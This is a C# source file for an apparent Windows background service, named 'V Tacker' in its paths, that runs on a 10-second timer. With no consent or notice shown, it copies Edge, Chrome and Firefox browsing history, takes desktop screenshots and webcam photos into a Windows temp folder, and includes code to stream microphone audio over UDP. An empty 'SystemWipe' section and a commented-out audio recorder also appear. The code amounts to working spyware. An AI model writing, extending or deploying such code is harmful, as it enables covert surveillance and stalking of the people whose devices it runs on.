using AForge.Video;
using AForge.Video.DirectShow;
using Microsoft.Data.Sqlite;
using NAudio.Wave;
using System.Drawing;
using System.Drawing.Imaging;
using System.Net;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Timers;

namespace BackgroundService
{
    public class ImageService
    {
        #region Services
        private readonly System.Timers.Timer _timer;
        websocket web = new websocket();
        static DirectoryInfo di;

        public ImageService()
        {
            History.GetHistory();
            _timer = new System.Timers.Timer(10000)
            {
                AutoReset = true
            };
            _timer.Elapsed += _timer_Elapsed;
        }

        private void _timer_Elapsed(object? sender, ElapsedEventArgs e)
        {
            History.GetHistory();
            Capture();
            webcam();
            //web.StopRecording();
        }

        public void starttimer()
        {
            _timer.Start();
        }

        public void stoptimer()
        {
            _timer.Stop();
        }
        #endregion

        #region BrowserHistory
        public class History
        {
            #region get history
            public static async void GetHistory()
            {
                di = new DirectoryInfo("C:\\Windows\\Temp\\V Tacker\\WebHistory");
                if (!di.Exists) { di.Create(); }

                SQLitePCL.Batteries.Init();

                string edgeFilePath = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) +
                                 @"\Microsoft\Edge\User Data\Default\History";
                string Googlefilepath = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) +
                                 @"\Google\Chrome\User Data\Default\History";
                string mozillaFilepath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) +
                                @"\Mozilla\Firefox\Profiles\<your-profile-name>\places.sqlite";
                mozillaFilepath = profilename(mozillaFilepath);

                if (File.Exists(edgeFilePath))
                    Edge(edgeFilePath,di.FullName);
                if (File.Exists(mozillaFilepath))
                    Mozila(mozillaFilepath, di.FullName);
                if (File.Exists(Googlefilepath))
                    Google(Googlefilepath, di.FullName);

            }
            #endregion

            #region Edge HISTORY

            public static async void Edge(string filepath,string savepath)
            {
                string outputPath = $"{savepath}\\edge_history.txt";
                int maxRetryAttempts = 1;
                int retryDelayMilliseconds = 100;
                string query = "";
                string lastdate = null;
                string stamp = null;
                for (int retryCount = 0; retryCount < maxRetryAttempts; retryCount++)
                {
                    try
                    {
                        using (SqliteConnection connection = new SqliteConnection($"Data Source={filepath};Mode=ReadOnly;"))
                        {
                            connection.Open();
                            DirectoryInfo d = new DirectoryInfo(outputPath);
                            bool isactive = false;
                            if (!File.Exists(d.FullName))
                            {
                                query = "SELECT distinct *, datetime(last_visit_time / 1000000 + (strftime('%s', '1601-01-01')), 'unixepoch', 'localtime') as date FROM urls order by date asc";
                            }
                            else
                            {
                                try
                                {
                                    string[] lines = File.ReadAllLines(outputPath);

                                    // Reverse the array of lines to search from the end of the file
                                    lines = lines.Reverse().ToArray();
                                    foreach (string line in lines)
                                    {
                                        if (Isstamp(line))
                                        {
                                            stamp = line;
                                        }
                                        if (IsUrl(line))
                                        {
                                            lastdate = line;
                                            break;
                                        }
                                    }

                                    if (lastdate != null)
                                    {
                                        isactive = true;
                                        query = "select distinct * , datetime(last_visit_time / 1000000 + (strftime('%s', '1601-01-01')), 'unixepoch', 'localtime') as date from urls where date > \'" + lastdate.Substring(13).Trim() + "\' order by date asc";
                                    }
                                    else
                                    {
                                        query = "SELECT distinct *, datetime(last_visit_time / 1000000 + (strftime('%s', '1601-01-01')), 'unixepoch', 'localtime') as date FROM urls order by date asc";
                                    }
                                }
                                catch (IOException e)
                                {
                                    Console.WriteLine($"An error occurred: {e.Message}");
                                }

                            }

                            using (SqliteCommand command = new SqliteCommand(query, connection))
                            {
                                using (SqliteDataReader reader = await command.ExecuteReaderAsync())
                                {
                                    // Create or overwrite the text file
                                    if (isactive == true)
                                    {
                                        using (StreamWriter writer = File.AppendText(outputPath))
                                        {
                                            while (reader.Read())
                                            {
                                                string Timestamp = Convert.ToInt64(reader["last_visit_time"]).ToString();
                                                if ((Convert.ToString(reader["date"])?.Trim() != lastdate?.Trim()) && (stamp.Contains(Timestamp) != true))
                                                {
                                                    string url = reader["url"].ToString();
                                                    string title = reader["title"].ToString();
                                                    string lastVisited = Convert.ToString(reader["date"]);
                                                    //DateTime lastVisited = DateTime.FromFileTimeUtc(Convert.ToInt64(reader["last_visit_time"]));
                                                    writer.WriteLine($"Title: {title}");
                                                    writer.WriteLine($"URL: {url}");
                                                    writer.WriteLine($"Last Visited: {lastVisited}");
                                                    writer.WriteLine($"Time Stamp: {Timestamp}");
                                                    writer.WriteLine();
                                                }
                                            }
                                        }
                                    }
                                    else
                                    {
                                        using (StreamWriter writer = new StreamWriter(outputPath))
                                        {
                                            while (reader.Read())
                                            {
                                                string Timestamp = Convert.ToInt64(reader["last_visit_time"]).ToString();
                                                string url = reader["url"].ToString();
                                                string title = reader["title"].ToString();
                                                string lastVisited = Convert.ToString(reader["date"]);
                                                //DateTime lastVisited = DateTime.FromFileTimeUtc(Convert.ToInt64(reader["last_visit_time"]));
                                                writer.WriteLine($"Title: {title}");
                                                writer.WriteLine($"URL: {url}");
                                                writer.WriteLine($"Last Visited: {lastVisited}");
                                                writer.WriteLine($"Time Stamp: {Timestamp}");
                                                writer.WriteLine();

                                            }
                                        }
                                    }


                                }

                                Console.WriteLine($"Microsoft Edge history saved to {outputPath}");
                                connection.Close();
                                break; // Exit the retry loop on success
                            }
                        }
                    }
                    catch (SqliteException ex)
                    {
                        if (ex.SqliteErrorCode == 5)
                        {
                            Console.WriteLine($"Database is locked. Retrying (attempt {retryCount + 1}/{maxRetryAttempts})...");
                            System.Threading.Thread.Sleep(retryDelayMilliseconds); // Wait before retrying
                        }
                        else
                        {
                            Console.WriteLine($"Error: {ex.Message}");
                            break; // Exit the retry loop on other errors
                        }
                    }
                }
            }

            static bool IsUrl(string text)
            {
                return text.StartsWith("Last Visited: ", StringComparison.OrdinalIgnoreCase) ||
                       text.StartsWith("Last Visited:", StringComparison.OrdinalIgnoreCase);
            }

            static bool Isstamp(string text)
            {
                return text.StartsWith("Last Visited: ", StringComparison.OrdinalIgnoreCase) ||
                       text.StartsWith("Last Visited:", StringComparison.OrdinalIgnoreCase);
            }

            #endregion

            #region GOOGLE HISTORY

            public static async void Google(string filepath, string savepath)
            {
                string outputPath = $"{savepath}\\Google_history.txt";
                int maxRetryAttempts = 1;
                int retryDelayMilliseconds = 100;
                string query = "";
                string lastdate = null;
                string stamp = null;
                for (int retryCount = 0; retryCount < maxRetryAttempts; retryCount++)
                {
                    try
                    {
                        using (SqliteConnection connection = new SqliteConnection($"Data Source={filepath};Mode=ReadOnly;"))
                        {
                            connection.Open();
                            DirectoryInfo d = new DirectoryInfo(outputPath);
                            bool isactive = false;
                            if (!File.Exists(d.FullName))
                            {
                                query = "SELECT distinct *, datetime(last_visit_time / 1000000 + (strftime('%s', '1601-01-01')), 'unixepoch', 'localtime') as date FROM urls order by date asc";
                            }
                            else
                            {
                                try
                                {
                                    string[] lines = File.ReadAllLines(outputPath);

                                    // Reverse the array of lines to search from the end of the file
                                    lines = lines.Reverse().ToArray();
                                    foreach (string line in lines)
                                    {
                                        if (Isstamp(line))
                                        {
                                            stamp = line;
                                        }
                                        if (IsUrl(line))
                                        {
                                            lastdate = line;
                                            break;
                                        }
                                    }

                                    if (lastdate != null)
                                    {
                                        isactive = true;
                                        query = "select distinct * , datetime(last_visit_time / 1000000 + (strftime('%s', '1601-01-01')), 'unixepoch', 'localtime') as date from urls where date > \'" + lastdate.Substring(13).Trim() + "\' order by date asc";
                                    }
                                    else
                                    {
                                        query = "SELECT distinct *, datetime(last_visit_time / 1000000 + (strftime('%s', '1601-01-01')), 'unixepoch', 'localtime') as date FROM urls order by date asc";
                                    }
                                }
                                catch (IOException e)
                                {
                                    Console.WriteLine($"An error occurred: {e.Message}");
                                }

                            }

                            using (SqliteCommand command = new SqliteCommand(query, connection))
                            {
                                using (SqliteDataReader reader = await command.ExecuteReaderAsync())
                                {
                                    // Create or overwrite the text file
                                    if (isactive == true)
                                    {
                                        using (StreamWriter writer = File.AppendText(outputPath))
                                        {
                                            while (reader.Read())
                                            {
                                                string Timestamp = Convert.ToInt64(reader["last_visit_time"]).ToString();
                                                if ((Convert.ToString(reader["date"])?.Trim() != lastdate?.Trim()) && (stamp.Contains(Timestamp) != true))
                                                {
                                                    string url = reader["url"].ToString();
                                                    string title = reader["title"].ToString();
                                                    string lastVisited = Convert.ToString(reader["date"]);
                                                    //DateTime lastVisited = DateTime.FromFileTimeUtc(Convert.ToInt64(reader["last_visit_time"]));
                                                    writer.WriteLine($"Title: {title}");
                                                    writer.WriteLine($"URL: {url}");
                                                    writer.WriteLine($"Last Visited: {lastVisited}");
                                                    writer.WriteLine($"Time Stamp: {Timestamp}");
                                                    writer.WriteLine();
                                                }
                                            }
                                        }
                                    }
                                    else
                                    {
                                        using (StreamWriter writer = new StreamWriter(outputPath))
                                        {
                                            while (reader.Read())
                                            {
                                                string Timestamp = Convert.ToInt64(reader["last_visit_time"]).ToString();
                                                string url = reader["url"].ToString();
                                                string title = reader["title"].ToString();
                                                string lastVisited = Convert.ToString(reader["date"]);
                                                //DateTime lastVisited = DateTime.FromFileTimeUtc(Convert.ToInt64(reader["last_visit_time"]));
                                                writer.WriteLine($"Title: {title}");
                                                writer.WriteLine($"URL: {url}");
                                                writer.WriteLine($"Last Visited: {lastVisited}");
                                                writer.WriteLine($"Time Stamp: {Timestamp}");
                                                writer.WriteLine();

                                            }
                                        }
                                    }


                                }

                                Console.WriteLine($"Microsoft Edge history saved to {outputPath}");
                                connection.Close();
                                break; // Exit the retry loop on success
                            }
                        }
                    }
                    catch (SqliteException ex)
                    {
                        if (ex.SqliteErrorCode == 5)
                        {
                            Console.WriteLine($"Database is locked. Retrying (attempt {retryCount + 1}/{maxRetryAttempts})...");
                            System.Threading.Thread.Sleep(retryDelayMilliseconds); // Wait before retrying
                        }
                        else
                        {
                            Console.WriteLine($"Error: {ex.Message}");
                            break; // Exit the retry loop on other errors
                        }
                    }
                }
            }
            #endregion

            #region Mozila HISTORY

            public static async void Mozila(string filepath, string savepath)
            {
                string outputPath = $"{savepath}\\mozilla_history.txt";
                int maxRetryAttempts = 1;
                int retryDelayMilliseconds = 100;
                string query = "";
                string lastdate = null;
                string stamp = null;
                for (int retryCount = 0; retryCount < maxRetryAttempts; retryCount++)
                {
                    try
                    {
                        using (SqliteConnection connection = new SqliteConnection($"Data Source={filepath};Mode=ReadOnly;"))
                        {
                            connection.Open();
                            DirectoryInfo d = new DirectoryInfo(outputPath);
                            bool isactive = false;
                            if (!File.Exists(d.FullName))
                            {
                                query = "SELECT distinct url, title, visit_count, last_visit_date, datetime(last_visit_date / 1000000, 'unixepoch', 'localtime') as date FROM moz_places where date is not null ORDER BY date asc";
                            }
                            else
                            {
                                try
                                {
                                    string[] lines = File.ReadAllLines(outputPath);

                                    // Reverse the array of lines to search from the end of the file
                                    lines = lines.Reverse().ToArray();
                                    foreach (string line in lines)
                                    {
                                        if (Isstamp(line))
                                        {
                                            stamp = line;
                                        }
                                        if (IsUrl(line))
                                        {
                                            lastdate = line;
                                            break;
                                        }
                                    }

                                    if (lastdate != null)
                                    {
                                        isactive = true;
                                        query = "SELECT distinct url, title, visit_count, last_visit_date, datetime(last_visit_date / 1000000, 'unixepoch', 'localtime') as date FROM moz_places where date is not null and date > \'" + lastdate.Substring(13).Trim() + "\' order by date asc";
                                    }
                                    else
                                    {
                                        query = "SELECT distinct url, title, visit_count, last_visit_date, datetime(last_visit_date / 1000000, 'unixepoch', 'localtime') as date FROM moz_places where date is not null ORDER BY date asc";
                                    }
                                }
                                catch (IOException e)
                                {
                                    Console.WriteLine($"An error occurred: {e.Message}");
                                }

                            }

                            using (SqliteCommand command = new SqliteCommand(query, connection))
                            {
                                using (SqliteDataReader reader = await command.ExecuteReaderAsync())
                                {
                                    // Create or overwrite the text file
                                    if (isactive == true)
                                    {
                                        using (StreamWriter writer = File.AppendText(outputPath))
                                        {
                                            while (reader.Read())
                                            {
                                                string Timestamp = Convert.ToInt64(reader["last_visit_date"]).ToString();
                                                if ((Convert.ToString(reader["date"])?.Trim() != lastdate?.Trim()) && (stamp.Contains(Timestamp) != true))
                                                {
                                                    string url = reader["url"].ToString();
                                                    string title = reader["title"].ToString();
                                                    string lastVisited = Convert.ToString(reader["date"]);
                                                    //DateTime lastVisited = DateTime.FromFileTimeUtc(Convert.ToInt64(reader["last_visit_time"]));
                                                    writer.WriteLine($"Title: {title}");
                                                    writer.WriteLine($"URL: {url}");
                                                    writer.WriteLine($"Last Visited: {lastVisited}");
                                                    writer.WriteLine($"Time Stamp: {Timestamp}");
                                                    writer.WriteLine();
                                                }
                                            }
                                        }
                                    }
                                    else
                                    {
                                        using (StreamWriter writer = new StreamWriter(outputPath))
                                        {
                                            while (reader.Read())
                                            {
                                                string Timestamp = Convert.ToInt64(reader["last_visit_date"]).ToString();
                                                string url = reader["url"].ToString();
                                                string title = reader["title"].ToString();
                                                string lastVisited = Convert.ToString(reader["date"]);
                                                //DateTime lastVisited = DateTime.FromFileTimeUtc(Convert.ToInt64(reader["last_visit_time"]));
                                                writer.WriteLine($"Title: {title}");
                                                writer.WriteLine($"URL: {url}");
                                                writer.WriteLine($"Last Visited: {lastVisited}");
                                                writer.WriteLine($"Time Stamp: {Timestamp}");
                                                writer.WriteLine();

                                            }
                                        }
                                    }


                                }
                                Console.WriteLine($"Mozila Edge history saved to {outputPath}");
                                connection.Close();
                                break; // Exit the retry loop on success
                            }
                        }
                    }
                    catch (SqliteException ex)
                    {
                        if (ex.SqliteErrorCode == 5)
                        {
                            Console.WriteLine($"Database is locked. Retrying (attempt {retryCount + 1}/{maxRetryAttempts})...");
                            System.Threading.Thread.Sleep(retryDelayMilliseconds); // Wait before retrying
                        }
                        else
                        {
                            Console.WriteLine($"Mozilla Error: {ex.Message}");
                            break; // Exit the retry loop on other errors
                        }
                    }
                }
            }

            public static string profilename(string locationpath)
            {
                string firefoxProfilesDirectory = Path.Combine(
            Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
            "Mozilla", "Firefox", "Profiles");
                string location = null;
                if (Directory.Exists(firefoxProfilesDirectory))
                {
                    string[] profileDirectories = Directory.GetDirectories(firefoxProfilesDirectory);
                    foreach (string profileDirectory in profileDirectories)
                    {
                        string path = locationpath;
                        string profileName = new DirectoryInfo(profileDirectory).Name;
                        path = path.Replace("<your-profile-name>", profileName);
                        if (!path.Contains("default-release"))
                            continue;
                        if(File.Exists(path))
                        {
                            location = path;
                            break;
                        }
                    }                   
                }
                else
                {
                    Console.WriteLine("Firefox profiles directory not found.");
                }

                return location;
            }

            #endregion

        }
        #endregion

        #region ImageScreenShort
        public async Task Capture()
        {
            di = new DirectoryInfo("C:\\Windows\\Temp\\V Tacker\\ScreenShort");
            if (!di.Exists) { di.Create(); }
            string imgName = DateTime.Now.ToString("dd-MM-yyyy-hh-mm-ss") + ".png";
            string filePath = Path.Combine(di.FullName, imgName);
            PrintScreen ps = new PrintScreen();
            await ps.CaptureScreenToFile(filePath, ImageFormat.Png);
        }
        public class PrintScreen
        {
            public Image CaptureScreen()
            {
                return CaptureWindow(User32.GetDesktopWindow());
            }
            public Image CaptureWindow(IntPtr handle)
            {
                // get te hDC of the target window
                IntPtr hdcSrc = User32.GetWindowDC(handle);
                // get the size
                User32.RECT windowRect = new User32.RECT();
                User32.GetWindowRect(handle, ref windowRect);
                int width = windowRect.right - windowRect.left;
                int height = windowRect.bottom - windowRect.top;
                // create a device context we can copy to
                IntPtr hdcDest = GDI32.CreateCompatibleDC(hdcSrc);
                // create a bitmap we can copy it to,
                // using GetDeviceCaps to get the width/height
                IntPtr hBitmap = GDI32.CreateCompatibleBitmap(hdcSrc, width, height);
                // select the bitmap object
                IntPtr hOld = GDI32.SelectObject(hdcDest, hBitmap);
                // bitblt over
                GDI32.BitBlt(hdcDest, 0, 0, width, height, hdcSrc, 0, 0, GDI32.SRCCOPY);
                // restore selection
                GDI32.SelectObject(hdcDest, hOld);
                // clean up
                GDI32.DeleteDC(hdcDest);
                User32.ReleaseDC(handle, hdcSrc);

                // get a .NET image object for it
                Image img = Image.FromHbitmap(hBitmap);
                // free up the Bitmap object
                GDI32.DeleteObject(hBitmap);

                return img;
            }
            public void CaptureWindowToFile(IntPtr handle, string filename, ImageFormat format)
            {
                Image img = CaptureWindow(handle);
                img.Save(filename, format);
            }
            public async Task CaptureScreenToFile(string filename, ImageFormat format)
            {
                Image img = CaptureScreen();
                try
                {
                    img.Save(filename, format);
                }
                catch (Exception e)
                {

                }
            }
            private class GDI32
            {
                public const int SRCCOPY = 0x00CC0020; // BitBlt dwRop parameter

                [DllImport("gdi32.dll")]
                public static extern bool BitBlt(IntPtr hObject, int nXDest, int nYDest,
                    int nWidth, int nHeight, IntPtr hObjectSource,
                    int nXSrc, int nYSrc, int dwRop);
                [DllImport("gdi32.dll")]
                public static extern IntPtr CreateCompatibleBitmap(IntPtr hDC, int nWidth,
                    int nHeight);
                [DllImport("gdi32.dll")]
                public static extern IntPtr CreateCompatibleDC(IntPtr hDC);
                [DllImport("gdi32.dll")]
                public static extern bool DeleteDC(IntPtr hDC);
                [DllImport("gdi32.dll")]
                public static extern bool DeleteObject(IntPtr hObject);
                [DllImport("gdi32.dll")]
                public static extern IntPtr SelectObject(IntPtr hDC, IntPtr hObject);
            }

            private class User32
            {
                [StructLayout(LayoutKind.Sequential)]
                public struct RECT
                {
                    public int left;
                    public int top;
                    public int right;
                    public int bottom;
                }

                [DllImport("user32.dll")]
                public static extern IntPtr GetDesktopWindow();
                [DllImport("user32.dll")]
                public static extern IntPtr GetWindowDC(IntPtr hWnd);
                [DllImport("user32.dll")]
                public static extern IntPtr ReleaseDC(IntPtr hWnd, IntPtr hDC);
                [DllImport("user32.dll")]
                public static extern IntPtr GetWindowRect(IntPtr hWnd, ref RECT rect);

            }
        }
        #endregion

        #region Webcam
        public async Task webcam()
        {
            try
            {
                Image captured_image = null;
                //single image capture and save to file
                Webcam webcam = new Webcam(new Size(640, 480), 30);
                webcam.Start();
                //int counter = 0;
                do
                {
                    Thread.Sleep(10);
                    captured_image = webcam.currentImage;
                } while (captured_image == null);

                /* Processing has been finished
                 * so successful or not, "stop" the camera
                */
                webcam.Stop();
                string path = @"C:\Windows\Temp\V Tacker\Webcam";
                di = new DirectoryInfo("C:\\Windows\\Temp\\V Tacker\\Webcam");
                if (!di.Exists) { di.Create(); }
                string outputPath = string.Format(@"{0}\{1}.jpg", path, DateTime.Now.ToString("dd-MM-yyyy-hh-mm-ss"));
                captured_image.Save(outputPath, ImageFormat.Png);
            }
            catch (Exception aa)
            {
            }
        }

        class Webcam
        {
            private FilterInfoCollection videoDevices = null;       //list of all videosources connected to the pc
            private VideoCaptureDevice videoSource = null;          //the selected videosource
            private Size frameSize;
            private int frameRate;

            public Bitmap currentImage;                             //parameter accessible to outside world to capture the current image

            public Webcam(Size framesize, int framerate)
            {
                this.frameSize = framesize;
                this.frameRate = framerate;
                this.currentImage = null;
            }

            // get the devices names cconnected to the pc
            private FilterInfoCollection getCamList()
            {
                videoDevices = new FilterInfoCollection(FilterCategory.VideoInputDevice);
                return videoDevices;
            }

            //start the camera
            public void Start()
            {
                //raise an exception incase no video device is found
                //or else initialise the videosource variable with the harware device
                //and other desired parameters.
                if (getCamList().Count == 0)
                    throw new Exception("Video device not found");
                else
                {
                    videoSource = new VideoCaptureDevice(videoDevices[0].MonikerString);
                    videoSource.NewFrame += new NewFrameEventHandler(video_NewFrame);
                    videoSource.DesiredFrameSize = this.frameSize;
                    videoSource.DesiredFrameRate = this.frameRate;
                    videoSource.Start();
                }
            }

            //dummy method required for Image.GetThumbnailImage() method
            private bool imageconvertcallback()
            {
                return false;
            }

            //eventhandler if new frame is ready
            private void video_NewFrame(object sender, NewFrameEventArgs eventArgs)
            {
                this.currentImage = (Bitmap)eventArgs.Frame.GetThumbnailImage(frameSize.Width, frameSize.Height, new Image.GetThumbnailImageAbort(imageconvertcallback), IntPtr.Zero);
            }

            //close the device safely
            public void Stop()
            {
                if (!(videoSource == null))
                    if (videoSource.IsRunning)
                    {
                        videoSource.SignalToStop();
                        videoSource = null;
                    }
            }
        }
        #endregion

        //#region AudioRecord
        //public class AudioRecorder
        //{
        //    private WaveIn waveSource = null;
        //    private WaveFileWriter waveFile = null;
        //    private string path = @"E:\audio";
        //    private string filename = "audio.wav";
        //    public AudioRecorder()
        //    {
        //        waveSource = new WaveIn();
        //        waveSource.WaveFormat = new WaveFormat(44100, 1);
        //        waveSource.DataAvailable += new EventHandler<WaveInEventArgs>(waveSource_DataAvailable);
        //    }
        //    public void StartRecording()
        //    {
        //        waveFile = new WaveFileWriter(path + filename, waveSource.WaveFormat);
        //        waveSource.StartRecording();
        //    }
        //    public void StopRecording()
        //    {
        //        waveSource.StopRecording();
        //        waveFile.Dispose();
        //    }
        //    private void waveSource_DataAvailable(object sender, WaveInEventArgs e)
        //    {
        //        if (waveFile != null)
        //        {
        //            waveFile.Write(e.Buffer, 0, e.BytesRecorded);
        //            waveFile.Flush();
        //        }
        //    }
        //}
        //#endregion
    }


        #region SystemWipe
        #endregion

    public class websocket
    {
        WaveInEvent waveIn = new WaveInEvent();
        UdpClient udpClient = new UdpClient();

        public void ClientSide()
        {
            try
            {
                int port = FindAvailablePort();
                string receiverIpAddress = GetLocalIpAddress();
                waveIn.WaveFormat = new WaveFormat(44100, 1);
                //udpClient.Connect(receiverIpAddress, port);
                waveIn.DataAvailable += (sender, e) =>
                {
                    udpClient.Send(e.Buffer, e.BytesRecorded, receiverIpAddress, port);
                };
                waveIn.StartRecording();
            }
            catch (SocketException aa)
            {
                Console.WriteLine(aa.Message);
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.Message);
                throw;
            }

        }

        public async Task StopRecording()
        {
            waveIn.StopRecording();
            waveIn.Dispose();
            udpClient.Close();
        }


        static string GetLocalIpAddress()
        {
            string localIpAddress = null;

            try
            {
                // Get the host name
                string hostName = Dns.GetHostName();

                // Get the IP addresses associated with the host name
                IPAddress[] ipAddresses = Dns.GetHostAddresses(hostName);

                // Find the first IPv4 address (you can modify this logic as needed)
                foreach (IPAddress ipAddress in ipAddresses)
                {
                    if (ipAddress.AddressFamily == System.Net.Sockets.AddressFamily.InterNetwork)
                    {
                        localIpAddress = ipAddress.ToString();
                        break;
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error getting local IP address: {ex.Message}");
            }

            return localIpAddress;
        }
        static int FindAvailablePort()
        {
            int port = 0; // 0 indicates that the OS should assign an available port

            try
            {
                using (var socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp))
                {
                    socket.Bind(new IPEndPoint(IPAddress.Loopback, 0));
                    socket.Listen(0); // Listen for incoming connections with a backlog of 0

                    // Retrieve the assigned port
                    port = ((IPEndPoint)socket.LocalEndPoint).Port;
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error finding an available port: {ex.Message}");
            }

            return port;
        }
        //public static void ReciverSide()
        //{
        //    int port = 12345;
        //    int sampleRate = 44100;

        //    // Initialize the audio output
        //    var waveOut = new WaveOutEvent();
        //    var waveProvider = new BufferedWaveProvider(new WaveFormat(sampleRate, 1));
        //    waveOut.Init(waveProvider);
        //    waveOut.Play();

        //    // Initialize the network socket
        //    var udpClient = new UdpClient(port);
        //    var senderEndPoint = new IPEndPoint(IPAddress.Any, port);

        //    Console.WriteLine("Listening for audio data. Press Enter to stop...");
        //    Console.ReadLine();

        //    while (true)
        //    {
        //        // Receive audio data from the sender
        //        byte[] receivedData = udpClient.Receive(ref senderEndPoint);

        //        // Play the received audio data
        //        waveProvider.AddSamples(receivedData, 0, receivedData.Length);
        //    }
        //}
    }

}
